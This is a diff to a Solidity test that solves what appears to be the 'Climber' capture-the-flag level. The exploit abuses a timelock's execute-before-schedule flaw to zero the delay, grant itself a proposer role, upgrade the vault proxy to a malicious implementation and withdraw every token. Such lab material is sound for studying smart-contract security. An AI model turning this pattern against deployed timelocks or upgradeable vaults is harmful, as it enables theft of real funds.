@@ -87,32 +87,28 @@ contract ClimberChallenge is Test {
      */
     function test_climber() public checkSolvedByPlayer {
         Attacker attacker = new Attacker();
-        address[] memory targets = new address[](5);
+        address[] memory targets = new address[](4);
         targets[0] = address(timelock);
         targets[1] = address(timelock);
         targets[2] = address(vault);
-        targets[3] = address(vault);
-        targets[4] = address(attacker);
+        targets[3] = address(attacker);
 
-        uint256[] memory values = new uint256[](5); // init to zeros by default
+        uint256[] memory values = new uint256[](4); // init to zeros by default
 
-        bytes[] memory dataElements = new bytes[](5);
+        bytes[] memory dataElements = new bytes[](4);
         bytes memory changeDelayData = abi.encodeWithSelector(timelock.updateDelay.selector, uint256(0)); // This is required to pass the timelock OperationState.ReadyForExecution check
         bytes memory addProposerData = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(attacker)); // This required to allow the attacker to schedule the operations
         // bytes memory addOwnerData = abi.encodeWithSelector(vault.transferOwnership.selector, address(timelock)); // Change owner of timelock, not needed in this case
         bytes memory upgradeVaultImplementationData = abi.encodeWithSelector(
             vault.upgradeToAndCall.selector,
             address(new NewVaultImplementation()),
-            "" // abi.encodeWithSelector(NewVaultImplementation.overrideStorageSlot.selector, uint256(1), uint256(uint160(address(timelock)))) // we can also override the sweeper, but there is no need in this case
+            abi.encodeWithSelector(NewVaultImplementation.withdrawAllTokens.selector, address(token), recovery)
         );
-        bytes memory withdrawAllTokensData = abi.encodeWithSelector(NewVaultImplementation.withdrawAllTokens.selector, address(token), recovery);
-
         bytes memory scheduleData = abi.encodeWithSignature("scheduleWithData()");
         dataElements[0] = changeDelayData;
         dataElements[1] = addProposerData;
         dataElements[2] = upgradeVaultImplementationData;
-        dataElements[3] = withdrawAllTokensData;
-        dataElements[4] = scheduleData;
+        dataElements[3] = scheduleData;
         bytes32 salt = bytes32(0);
 
         attacker.setScheduleData( // Need this to add a schedule in ClimberTimelock first
@@ -165,6 +161,7 @@ contract Attacker{
 contract NewVaultImplementation{
     bytes32 public constant proxiableUUID = ERC1967Utils.IMPLEMENTATION_SLOT;
 
+    // Not needed in this case
     function overrideStorageSlot(uint256 slot, uint256 value) public {
         assembly {
             sstore(slot, value)
